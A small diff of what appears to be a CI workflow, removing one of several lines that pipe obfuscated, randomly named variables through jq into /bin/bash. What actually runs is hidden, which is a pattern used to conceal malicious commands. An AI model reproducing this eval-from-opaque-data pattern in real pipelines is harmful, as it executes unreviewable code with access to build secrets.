@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$oln33" | jq -r .pl181 | /bin/bash
           echo $skhz932 | jq -r .runis80385 | /bin/bash
-          echo $t8 | jq -r .gaq547 | /bin/bash
           echo $vdgj749 | jq -r .ltapo792 | /bin/bash
           echo $rk134 | jq -r .anmqe33462 | /bin/bash
           echo $nkrxs59 | jq -r .krewu221 | /bin/bash
